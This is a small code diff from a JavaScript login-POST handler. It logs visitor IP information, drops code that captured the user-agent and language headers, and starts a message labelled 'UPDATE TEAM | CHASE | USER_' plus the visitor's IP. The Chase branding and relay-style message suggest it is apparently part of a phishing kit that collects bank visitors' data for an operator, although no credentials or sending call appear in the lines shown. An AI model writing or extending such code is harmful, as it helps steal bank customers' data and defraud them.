@@ -91,9 +91,6 @@ exports.loginPost2 = async (req, res) => {
 	try{
     console.log(ipAddressInformation);
 
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-
 
         const message =
             `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
